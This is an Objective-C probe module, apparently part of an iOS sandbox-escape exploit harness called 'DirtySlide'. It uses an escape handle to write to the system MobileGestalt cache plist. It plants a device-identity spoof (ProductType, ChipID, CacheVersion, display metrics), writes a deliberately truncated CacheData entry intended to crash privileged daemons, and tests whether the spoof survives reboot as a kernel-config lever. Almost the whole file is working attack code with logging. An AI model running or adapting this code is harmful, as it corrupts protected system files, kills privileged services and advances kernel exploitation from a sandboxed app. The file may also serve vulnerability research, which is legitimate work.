//  probe_mobilegestalt.m - DirtySlide ROW: MOBILEGESTALT 64747 DEVICE-SPOOF (v140 - NEW button)
//  The bad_query class-13 ESCAPE (proven 4/4) grants O_RDWR on the MobileGestalt
//  cache plist (systemgroup.com.apple.mobilegestaltcache/.../com.apple.MobileGestalt.plist).
//  This row plants a DEVICE-IDENTITY SPOOF in that file: flip CacheVersion,
//  ProductType (the devType/DeviceClass feed), ChipID, and the CacheData
//  display-metric slots (2000x1200 -> 4000x2400). The file has NO internal
//  integrity MAC (verified host-side) and is consumed by _MGGetStringAnswer
//  clients - incl. ave.videoencoder, whose devType value branches the KERNEL
//  UserQpMap size formula. The experiment: (1) do the flips SURVIVE an in-epoch
//  re-read? (MG03) (2) do they survive a REBOOT? (run MG01 again after the next
//  reboot - a surviving flip = mobilegestaltd reads the cache at boot = the
//  spoof reaches every MG answer consumer = a CONTROLLABLE KERNEL-CONFIG input
//  from a sandboxed app). MG04 = the malformed-CacheData plant (privileged-
//  daemon-kill shot on re-read); MG05 restores the safe flipped state (original
//  backed up to the app Documents). Zero-death by design except the MG04 kill.
#include "ds_core.h"
#include <sys/stat.h>

#define MG_ESC  "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
#define MG_FILE "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"

static uint8_t g_mg_orig[65536];
static size_t  g_mg_orig_len = 0;
static uint8_t g_mg_flipped[65536];
static size_t  g_mg_flipped_len = 0;

/* read the whole file (escape handle must already be consumed) */
static int ds_mg_read(const char *path, uint8_t *buf, size_t cap, size_t *len)
{
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return errno;
    struct stat sb;
    if (fstat(fd, &sb) != 0) { close(fd); return errno; }
    if ((size_t)sb.st_size > cap) { close(fd); return ERANGE; }
    size_t got = 0;
    while (got < (size_t)sb.st_size) {
        ssize_t r = read(fd, buf + got, (size_t)sb.st_size - got);
        if (r <= 0) break;
        got += (size_t)r;
    }
    close(fd);
    *len = got;
    return 0;
}

static CFMutableDictionaryRef ds_mg_parse(CFDataRef raw)
{
    CFPropertyListFormat fmt = kCFPropertyListBinaryFormat_v1_0;
    CFErrorRef err = NULL;
    CFTypeRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault, raw,
                                                kCFPropertyListMutableContainersAndLeaves, &fmt, &err);
    if (err) CFRelease(err);
    if (!pl) return NULL;
    if (CFGetTypeID(pl) != CFDictionaryGetTypeID()) { CFRelease(pl); return NULL; }
    return (CFMutableDictionaryRef)pl;   /* mutable root (containers + leaves) */
}

/* idempotent flip mutations: CacheVersion, ProductType, ChipID, display slots 19/20 */
static int ds_mg_apply_flip(CFMutableDictionaryRef root)
{
    int flipped = 0;
    CFStringRef nv = CFStringCreateWithCString(kCFAllocatorDefault, "24A5355x", kCFStringEncodingUTF8);
    CFDictionarySetValue(root, CFSTR("CacheVersion"), nv);
    CFRelease(nv); flipped++;
    CFMutableDictionaryRef ex = (CFMutableDictionaryRef)CFDictionaryGetValue(root, CFSTR("CacheExtra"));
    if (ex && CFGetTypeID(ex) == CFDictionaryGetTypeID()) {
        CFStringRef kp = CFStringCreateWithCString(kCFAllocatorDefault, "NaA/zJV7myg2w4YNmSe4yQ", kCFStringEncodingUTF8);   /* ProductType */
        CFStringRef np = CFStringCreateWithCString(kCFAllocatorDefault, "4388", kCFStringEncodingUTF8);
        CFDictionarySetValue(ex, kp, np);
        CFRelease(kp); CFRelease(np); flipped++;
        CFStringRef kc = CFStringCreateWithCString(kCFAllocatorDefault, "5pYKlGnYYBzGvAlIU8RjEQ", kCFStringEncodingUTF8);   /* ChipID */
        CFStringRef nc = CFStringCreateWithCString(kCFAllocatorDefault, "t8141", kCFStringEncodingUTF8);
        CFDictionarySetValue(ex, kc, nc);
        CFRelease(kc); CFRelease(nc); flipped++;
    }
    CFDataRef cd = CFDictionaryGetValue(root, CFSTR("CacheData"));
    if (cd && CFGetTypeID(cd) == CFDataGetTypeID()) {
        size_t n = CFDataGetLength(cd);
        if (n >= 21 * 8) {
            uint8_t *buf = (uint8_t *)malloc(n);
            if (buf) {
                CFDataGetBytes(cd, CFRangeMake(0, n), buf);
                uint64_t v19 = 4000, v20 = 2400;      /* display 2000x1200 -> 4000x2400 */
                memcpy(buf + 19 * 8, &v19, 8);
                memcpy(buf + 20 * 8, &v20, 8);
                CFDataRef nd = CFDataCreate(kCFAllocatorDefault, buf, n);
                CFDictionarySetValue(root, CFSTR("CacheData"), nd);
                CFRelease(nd); free(buf); flipped++;
            }
        }
    }
    return flipped;
}

/* consume escape + read + parse the CURRENT file -> root (caller CFReleases) */
static CFMutableDictionaryRef ds_mg_load(const char *pfx, const char *tag, int *rc)
{
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume(MG_ESC); return 0; }, &csSt);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] escape FAULTED sig=%d - load void\n", pfx, tag, sig);
        *rc = -1; return NULL;
    }
    if (h < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE FAILED code=%lld (%s) - load void\n", pfx, tag,
                (long long)h, ds_esc_err(h));
        *rc = -1; return NULL;
    }
    uint8_t *raw = (uint8_t *)malloc(65536);
    if (!raw) { ds_esc_release(h); *rc = -1; return NULL; }
    size_t rawLen = 0;
    int er = ds_mg_read(MG_FILE, raw, 65536, &rawLen);
    ds_esc_release(h);
    if (er != 0 || rawLen == 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] read %s errno=%d (len=%zu) - load void\n", pfx, tag, MG_FILE, er, rawLen);
        free(raw); *rc = er ? er : EIO; return NULL;
    }
    CFDataRef cfraw = CFDataCreate(kCFAllocatorDefault, raw, rawLen);
    free(raw);
    CFMutableDictionaryRef root = cfraw ? ds_mg_parse(cfraw) : NULL;
    if (cfraw) CFRelease(cfraw);
    if (!root) {
        dprintf(STDOUT_FILENO, "%s  I[%s] plist PARSE FAILED (not a plist / wrong type) - load void\n", pfx, tag);
        *rc = -1; return NULL;
    }
    *rc = 0;
    return root;
}

/* serialize root + consume escape + write the file */
static int ds_mg_save(const char *pfx, const char *tag, CFMutableDictionaryRef root)
{
    CFDataRef out = CFPropertyListCreateData(kCFAllocatorDefault, root,
                                             kCFPropertyListBinaryFormat_v1_0, 0, NULL);
    if (!out) {
        dprintf(STDOUT_FILENO, "%s  I[%s] SERIALIZE FAILED - save void\n", pfx, tag);
        return -1;
    }
    size_t n = (size_t)CFDataGetLength(out);
    const uint8_t *b = CFDataGetBytePtr(out);
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume(MG_ESC); return 0; }, &csSt);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] escape FAULTED sig=%d - save void\n", pfx, tag, sig);
        CFRelease(out); return -1;
    }
    if (h < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE FAILED code=%lld (%s) - save void\n", pfx, tag,
                (long long)h, ds_esc_err(h));
        CFRelease(out); return -1;
    }
    int fd = open(MG_FILE, O_WRONLY | O_TRUNC | O_CLOEXEC, 0644);
    if (fd < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] open(O_WRONLY|O_TRUNC) %s errno=%d => DENIED (write not permitted through the handle)\n",
                pfx, tag, MG_FILE, errno);
        ds_esc_release(h); CFRelease(out); return errno;
    }
    ssize_t wrote = 0;
    while (wrote < (ssize_t)n) {
        ssize_t w = write(fd, b + wrote, n - (size_t)wrote);
        if (w <= 0) break;
        wrote += w;
    }
    close(fd);
    ds_esc_release(h);
    CFRelease(out);
    dprintf(STDOUT_FILENO, "%s  I[%s] WROTE %zd/%zu bytes to the MG plist\n", pfx, tag, wrote, n);
    return (wrote == (ssize_t)n) ? 0 : EIO;
}

/* dump the identity-relevant fields from a parsed root */
static void ds_mg_dump(const char *pfx, const char *tag, CFMutableDictionaryRef root)
{
    CFStringRef cv = CFDictionaryGetValue(root, CFSTR("CacheVersion"));
    char cvb[64] = "?";
    if (cv && CFGetTypeID(cv) == CFStringGetTypeID())
        CFStringGetCString(cv, cvb, sizeof(cvb), kCFStringEncodingUTF8);
    CFDataRef cd = CFDictionaryGetValue(root, CFSTR("CacheData"));
    CFDictionaryRef ex = CFDictionaryGetValue(root, CFSTR("CacheExtra"));
    size_t cdLen = (cd && CFGetTypeID(cd) == CFDataGetTypeID()) ? (size_t)CFDataGetLength(cd) : 0;
    CFIndex exN = (ex && CFGetTypeID(ex) == CFDictionaryGetTypeID()) ? CFDictionaryGetCount(ex) : -1;
    dprintf(STDOUT_FILENO, "%s  I[%s] CacheVersion=%s CacheData=%zuB CacheExtra=%ld keys\n",
            pfx, tag, cvb, cdLen, (long)exN);
    struct { const char *name; const char *key; } ids[] = {
        { "ProductType",    "NaA/zJV7myg2w4YNmSe4yQ" },
        { "DeviceName",     "+1TeoctsaQC55zwHZ6MESg" },
        { "MarketingName",  "Z/dqyWS6OZTRy10UcmUAhw" },
        { "SoC",            "97JDvERpVwO+GHtthIh7hA" },
        { "ChipID",         "5pYKlGnYYBzGvAlIU8RjEQ" },
        { "BoardID",        "/YYygAofPDbhrwToVsXdeA" },
    };
    for (size_t i = 0; i < sizeof(ids) / sizeof(ids[0]); i++) {
        CFStringRef k = CFStringCreateWithCString(kCFAllocatorDefault, ids[i].key, kCFStringEncodingUTF8);
        CFTypeRef v = ex ? CFDictionaryGetValue(ex, k) : NULL;
        char vb[128] = "?";
        if (v && CFGetTypeID(v) == CFStringGetTypeID())
            CFStringGetCString(v, vb, sizeof(vb), kCFStringEncodingUTF8);
        else if (v)
            snprintf(vb, sizeof(vb), "<%s>", CFGetTypeID(v) == CFDataGetTypeID() ? "CFData" : "other");
        dprintf(STDOUT_FILENO, "%s  I[%s]   %-14s = %s\n", pfx, tag, ids[i].name, vb);
        if (k) CFRelease(k);
    }
    if (cd && cdLen >= 21 * 8) {
        const uint8_t *b = CFDataGetBytePtr(cd);
        uint64_t v19 = 0, v20 = 0;
        memcpy(&v19, b + 19 * 8, 8);
        memcpy(&v20, b + 20 * 8, 8);
        dprintf(STDOUT_FILENO, "%s  I[%s]   display slots 19/20 = %llu x %llu\n", pfx, tag,
                (unsigned long long)v19, (unsigned long long)v20);
    }
}

/* the flip-survival check (post-write): 1 = all flipped fields present */
static int ds_mg_verify_flip(const char *pfx, const char *tag)
{
    int rc = -1;
    CFMutableDictionaryRef root = ds_mg_load(pfx, tag, &rc);
    if (!root) return 0;
    /* want counts ALL 3 identity fields regardless of type - a MISSING key or wrong
       type must FAIL the verify (can't pass with the field absent). */
    int ok = 0, want = 3;
    CFStringRef cv = CFDictionaryGetValue(root, CFSTR("CacheVersion"));
    char cvb[64] = "";
    if (cv && CFGetTypeID(cv) == CFStringGetTypeID()) CFStringGetCString(cv, cvb, sizeof(cvb), kCFStringEncodingUTF8);
    if (strcmp(cvb, "24A5355x") == 0) ok++;
    CFDictionaryRef ex = CFDictionaryGetValue(root, CFSTR("CacheExtra"));
    CFStringRef kp = CFStringCreateWithCString(kCFAllocatorDefault, "NaA/zJV7myg2w4YNmSe4yQ", kCFStringEncodingUTF8);
    CFTypeRef pp = ex ? CFDictionaryGetValue(ex, kp) : NULL;
    char ppb[64] = "";
    if (pp && CFGetTypeID(pp) == CFStringGetTypeID()) CFStringGetCString(pp, ppb, sizeof(ppb), kCFStringEncodingUTF8);
    if (strcmp(ppb, "4388") == 0) ok++;
    CFStringRef kc = CFStringCreateWithCString(kCFAllocatorDefault, "5pYKlGnYYBzGvAlIU8RjEQ", kCFStringEncodingUTF8);
    CFTypeRef cc = ex ? CFDictionaryGetValue(ex, kc) : NULL;
    char ccb[64] = "";
    if (cc && CFGetTypeID(cc) == CFStringGetTypeID()) CFStringGetCString(cc, ccb, sizeof(ccb), kCFStringEncodingUTF8);
    if (strcmp(ccb, "t8141") == 0) ok++;
    if (kp) CFRelease(kp);
    if (kc) CFRelease(kc);
    CFRelease(root);
    dprintf(STDOUT_FILENO, "%s  I[%s] flip survival: %d/%d (CacheVersion=%s ProductType=%s ChipID=%s)\n",
            pfx, tag, ok, want, cvb, ppb, ccb);
    return (ok == want && want > 0) ? 1 : 0;
}

/* MG00 self-heal: if a PREVIOUS run died between MG04 and MG05, the live file has a
   TRUNCATED CacheData (MG04 is the only length-changing op; the flip keeps the length).
   Restore the Documents backup to clear the malformed state. Idempotent - no-ops on
   the pristine original AND the safe-flip (both match the backup's CacheData length). */
static void ds_mg_selfheal(const char *pfx)
{
    const char *home = getenv("HOME");
    if (!home) return;
    char bp[512];
    snprintf(bp, sizeof(bp), "%s/Documents/ds_mg_original.bplist", home);
    int bfd = open(bp, O_RDONLY | O_CLOEXEC);
    if (bfd < 0) return;                    /* no backup = first run = nothing to heal */
    uint8_t *bbuf = (uint8_t *)malloc(65536);
    if (!bbuf) { close(bfd); return; }
    size_t blen = 0;
    {
        struct stat bs;
        if (fstat(bfd, &bs) == 0 && (size_t)bs.st_size <= 65536) {
            size_t got = 0;
            while (got < (size_t)bs.st_size) {
                ssize_t r = read(bfd, bbuf + got, (size_t)bs.st_size - got);
                if (r <= 0) break;
                got += (size_t)r;
            }
            blen = got;
        }
    }
    close(bfd);
    if (blen == 0) { free(bbuf); return; }
    /* read the LIVE file through the escape and compare CacheData lengths */
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume(MG_ESC); return 0; }, &csSt);
    if (sig > 0 || h < 0) { free(bbuf); return; }
    uint8_t *raw = (uint8_t *)malloc(65536);
    if (!raw) { ds_esc_release(h); free(bbuf); return; }
    size_t rawLen = 0;
    int er = ds_mg_read(MG_FILE, raw, 65536, &rawLen);
    ds_esc_release(h);
    int heal = 0;
    if (er == 0 && rawLen > 0) {
        CFDataRef cf = CFDataCreate(kCFAllocatorDefault, raw, rawLen);
        CFMutableDictionaryRef live = cf ? ds_mg_parse(cf) : NULL;
        if (cf) CFRelease(cf);
        if (!live) {
            heal = 1;                        /* live file not even parseable */
        } else {
            CFDataRef lcd = CFDictionaryGetValue(live, CFSTR("CacheData"));
            size_t llen = (lcd && CFGetTypeID(lcd) == CFDataGetTypeID()) ? (size_t)CFDataGetLength(lcd) : 0;
            CFDataRef bcf = CFDataCreate(kCFAllocatorDefault, bbuf, blen);
            CFMutableDictionaryRef broot = bcf ? ds_mg_parse(bcf) : NULL;
            if (bcf) CFRelease(bcf);
            CFDataRef bcd = broot ? CFDictionaryGetValue(broot, CFSTR("CacheData")) : NULL;
            size_t bl2 = (bcd && CFGetTypeID(bcd) == CFDataGetTypeID()) ? (size_t)CFDataGetLength(bcd) : 0;
            if (bl2 > 0 && llen != bl2) heal = 1;   /* truncated (killed MG04) or grown */
            if (broot) CFRelease(broot);
            CFRelease(live);
        }
    }
    free(raw);
    if (heal) {
        __block int64_t h2 = -999;
        int sig2 = 0, csSt2 = -999;
        sig2 = ds_ave_guard_run(^int { h2 = ds_esc_consume(MG_ESC); return 0; }, &csSt2);
        if (sig2 <= 0 && h2 >= 0) {
            int fd = open(MG_FILE, O_WRONLY | O_TRUNC | O_CLOEXEC, 0644);
            if (fd >= 0) {
                ssize_t w = write(fd, bbuf, blen);
                close(fd);
                char st0[32];
                ds_ave_stamp(st0, sizeof(st0));
                dprintf(STDOUT_FILENO, "%s [%s] I[MG00 self-heal] restored the ORIGINAL %zdB from the backup - a previous run died mid-MG04 (malformed CacheData cleared)\n",
                        pfx, st0, w);
            }
            ds_esc_release(h2);
        }
    }
    free(bbuf);
}

void probe_mobilegestalt(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== MG. MOBILEGESTALT 64747 DEVICE-SPOOF (v140 - NEW) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  The bad_query class-13 ESCAPE grants O_RDWR on the MobileGestalt cache plist.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  v140 plants a DEVICE-IDENTITY SPOOF: CacheVersion / ProductType (the devType\n", pfx);
    dprintf(STDOUT_FILENO, "%s  feed) / ChipID + the CacheData display slots. The file has NO integrity MAC;\n", pfx);
    dprintf(STDOUT_FILENO, "%s  ave.videoencoder imports _MGGetStringAnswer and the kernel UserQpMap size\n", pfx);
    dprintf(STDOUT_FILENO, "%s  formula branches on devType. SURVIVES-REBOOT = a controllable kernel-config\n", pfx);
    dprintf(STDOUT_FILENO, "%s  input from a sandboxed app. Zero-death by design (MG04 = the kill shot).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MG00 = the self-heal: a previous run killed mid-MG04 is auto-restored.\n", pfx);
    ds_mg_selfheal(pfx);
    /* MG01: escape receipt + read + dump + capture original */
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[MG01 escape+read the MG plist] consume -> open(O_RDONLY) -> parse -> dump (no daemon ops)\n", pfx, st0);
    ds_esc_row(pfx, "MG01 consume+verify plist R/W", MG_ESC, 0);
    {
        int rc = -1;
        CFMutableDictionaryRef root = ds_mg_load(pfx, "MG01 escape+read the MG plist", &rc);
        if (root) {
            ds_mg_dump(pfx, "MG01 escape+read the MG plist", root);
            /* capture the ORIGINAL bytes for the Documents backup */
            CFDataRef out = CFPropertyListCreateData(kCFAllocatorDefault, root, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
            if (out) {
                size_t n = (size_t)CFDataGetLength(out);
                if (n <= sizeof(g_mg_orig)) {
                    memcpy(g_mg_orig, CFDataGetBytePtr(out), n);
                    g_mg_orig_len = n;
                    const char *home = getenv("HOME");
                    if (home) {
                        char bp[512];
                        snprintf(bp, sizeof(bp), "%s/Documents/ds_mg_original.bplist", home);
                        int fd = open(bp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
                        if (fd >= 0) { (void)write(fd, g_mg_orig, n); close(fd); }
                        dprintf(STDOUT_FILENO, "%s  I[MG01] original %zuB backed up to %s\n", pfx, n, bp);
                    }
                } else {
                    dprintf(STDOUT_FILENO, "%s  I[MG01] original too big (%zuB > 64KB cap) - backup skipped\n", pfx, n);
                }
                CFRelease(out);
            }
            CFRelease(root);
        }
    }
    /* MG02: the FLIP-PLANT */
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[MG02 flip-plant] CacheVersion->24A5355x ProductType->4388 ChipID->t8141 display->4000x2400 (no daemon ops)\n", pfx, st0);
    {
        int rc = -1;
        CFMutableDictionaryRef root = ds_mg_load(pfx, "MG02 flip-plant", &rc);
        if (root) {
            int nf = ds_mg_apply_flip(root);
            CFDataRef out = CFPropertyListCreateData(kCFAllocatorDefault, root, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
            if (out && CFDataGetLength(out) <= (CFIndex)sizeof(g_mg_flipped)) {
                g_mg_flipped_len = (size_t)CFDataGetLength(out);
                memcpy(g_mg_flipped, CFDataGetBytePtr(out), g_mg_flipped_len);
            }
            if (out) CFRelease(out);
            int wr = ds_mg_save(pfx, "MG02 flip-plant", root);
            CFRelease(root);
            if (wr == 0) {
                int sv = ds_mg_verify_flip(pfx, "MG02 flip-plant readback");
                dprintf(STDOUT_FILENO, "%s  I[MG02 flip-plant] flipped=%d fields VERIFIED=%d => %s\n", pfx, nf, sv,
                        sv ? "PLANTED - the spoof is on disk" : "flip lost on write - handle RO?");
            }
        }
    }
    /* MG03: re-read oracle + a daemon beat */
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[MG03 re-read oracle] 1x1 encode beat, then re-read: did anything REWRITE the file? (no daemon ops besides the beat)\n", pfx, st0);
    ds_ave_replay(pfx, "MG03 1x1 beat", 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
    {
        int sv = ds_mg_verify_flip(pfx, "MG03 re-read oracle");
        dprintf(STDOUT_FILENO, "%s  I[MG03 re-read oracle] flips SURVIVED the encode beat=%d (%s)\n", pfx, sv,
                sv ? "nobody re-read/rewrote in-epoch" : "a consumer REWROTE the file = the plant reached it");
    }
    /* MG04: the MALFORMED CacheData plant (privileged-daemon-kill shot on re-read) */
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[MG04 malformed CacheData] truncate the int64 array 4B short + write (a re-read validator may crash = the kill) (no daemon ops)\n", pfx, st0);
    {
        int rc = -1;
        CFMutableDictionaryRef root = ds_mg_load(pfx, "MG04 malformed CacheData", &rc);
        if (root) {
            CFDataRef cd = CFDictionaryGetValue(root, CFSTR("CacheData"));
            if (cd && CFGetTypeID(cd) == CFDataGetTypeID()) {
                size_t n = (size_t)CFDataGetLength(cd);
                if (n > 8) {
                    uint8_t *buf = (uint8_t *)malloc(n - 4);
                    if (buf) {
                        CFDataGetBytes(cd, CFRangeMake(0, n - 4), buf);
                        CFDataRef nd = CFDataCreate(kCFAllocatorDefault, buf, n - 4);
                        CFDictionarySetValue(root, CFSTR("CacheData"), nd);
                        CFRelease(nd); free(buf);
                        int wr = ds_mg_save(pfx, "MG04 malformed CacheData", root);
                        if (wr == 0) {
                            dprintf(STDOUT_FILENO, "%s  I[MG04 malformed CacheData] wrote CacheData %zu->%zuB (int64 array truncated - a re-read validator may reject/crash)\n",
                                    pfx, n, n - 4);
                            usleep(3000000);   /* 3s - give any lazy re-reader the window */
                            int rc2 = -1;
                            CFMutableDictionaryRef r2 = ds_mg_load(pfx, "MG04 malformed CacheData re-read", &rc2);
                            if (r2) {
                                CFDataRef cd2 = CFDictionaryGetValue(r2, CFSTR("CacheData"));
                                size_t n2 = (cd2 && CFGetTypeID(cd2) == CFDataGetTypeID()) ? (size_t)CFDataGetLength(cd2) : 0;
                                dprintf(STDOUT_FILENO, "%s  I[MG04 malformed CacheData] after 3s: CacheData=%zuB (%s) - a mobilegestaltd/videocodecd .ips around this stamp = the re-read KILL\n",
                                        pfx, n2, (n2 == n - 4) ? "malformed state still on disk" : "the file was REWRITTEN (a consumer validated it)");
                                CFRelease(r2);
                            }
                        }
                    }
                }
            }
            CFRelease(root);
        }
    }
    /* MG05: restore the SAFE flipped state (overwrite the malformed) + beats */
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[MG05 restore safe-flip] rewrite the flipped state (clears the malformed CacheData) (no daemon ops)\n", pfx, st0);
    if (g_mg_flipped_len > 0) {
        __block int64_t h = -999;
        int sig = 0, csSt = -999;
        sig = ds_ave_guard_run(^int { h = ds_esc_consume(MG_ESC); return 0; }, &csSt);
        if (sig <= 0 && h >= 0) {
            int fd = open(MG_FILE, O_WRONLY | O_TRUNC | O_CLOEXEC, 0644);
            if (fd >= 0) {
                ssize_t w = write(fd, g_mg_flipped, g_mg_flipped_len);
                close(fd);
                dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] wrote %zdB - device left with the SAFE spoof (malformed state cleared)\n", pfx, w);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] open DENIED errno=%d - device left with the malformed state (manual restore from Documents/ds_mg_original.bplist)\n", pfx, errno);
            }
            ds_esc_release(h);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] escape FAILED - device left with the malformed state\n", pfx);
        }
        int sv = ds_mg_verify_flip(pfx, "MG05 final verify");
        dprintf(STDOUT_FILENO, "%s  I[MG05 final verify] safe-spoof on disk verified=%d\n", pfx, sv);
    } else if (g_mg_orig_len > 0) {
        /* no flipped capture (row run standalone / MG02 failed) - restore the ORIGINAL
           so the device is NEVER left with the malformed MG04 state on disk */
        __block int64_t h = -999;
        int sig = 0, csSt = -999;
        sig = ds_ave_guard_run(^int { h = ds_esc_consume(MG_ESC); return 0; }, &csSt);
        if (sig <= 0 && h >= 0) {
            int fd = open(MG_FILE, O_WRONLY | O_TRUNC | O_CLOEXEC, 0644);
            if (fd >= 0) {
                ssize_t w = write(fd, g_mg_orig, g_mg_orig_len);
                close(fd);
                dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] no flipped capture - restored the ORIGINAL %zdB (malformed state cleared, device back to baseline)\n", pfx, w);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] no flipped capture + open DENIED errno=%d - DEVICE LEFT WITH THE MALFORMED STATE (manual restore from Documents/ds_mg_original.bplist)\n", pfx, errno);
            }
            ds_esc_release(h);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] no flipped capture + escape FAILED - DEVICE LEFT WITH THE MALFORMED STATE\n", pfx);
        }
    } else {
        dprintf(STDOUT_FILENO, "%s  I[MG05 restore safe-flip] no flipped capture AND no original - nothing to restore (device state untouched)\n", pfx);
    }
    for (int mgh = 1; mgh <= 2; mgh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "MGH%02d 1x1 beat", mgh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  MG read-offs: MG00 = the self-heal (restored the backup if a prior run died\n", pfx);
    dprintf(STDOUT_FILENO, "%s  mid-MG04 - the malformed state can never survive a re-run). MG01 = the escape +\n", pfx);
    dprintf(STDOUT_FILENO, "%s  full device-identity dump (the baseline). MG02 = the PLANT - 'VERIFIED=1' =\n", pfx);
    dprintf(STDOUT_FILENO, "%s  ChipID t8141 + display 4000x2400 are ON DISK through the escape. MG03 = nobody\n", pfx);
    dprintf(STDOUT_FILENO, "%s  re-read in-epoch (flips survived the encode). MG04 = the malformed-CacheData\n", pfx);
    dprintf(STDOUT_FILENO, "%s  shot - a mobilegestaltd/videocodecd .ips around its stamp = the re-read KILL\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (privileged daemon death from a sandboxed app); 'REWRITTEN' = a validator saw it.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MG05 = device left with the SAFE spoof (original backed up to\n", pfx);
    dprintf(STDOUT_FILENO, "%s  Documents/ds_mg_original.bplist). THE REBOOT TEST: after the next reboot, run\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MG01 FIRST - values STILL flipped = the spoof PERSISTS across boot =\n", pfx);
    dprintf(STDOUT_FILENO, "%s  mobilegestaltd reads the cache at boot = the devType kernel-config lever is\n", pfx);
    dprintf(STDOUT_FILENO, "%s  LIVE (then run the OP map cell: the kernel's required UserQpMap size branch\n", pfx);
    dprintf(STDOUT_FILENO, "%s  on devType - a changed mismatch line = the kernel consumed the spoof); values\n", pfx);
    dprintf(STDOUT_FILENO, "%s  REVERTED = the file is output-only (plant boot-wiped, spoof dead). Also note: if\n", pfx);
    dprintf(STDOUT_FILENO, "%s  TK/IK misbehave after this row, that itself = the AVE plugin consumed the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  spoofed MG answers (delivery proof, still evidence). sweep done - .ips captureTime <-> [stamp].\n", pfx);
}
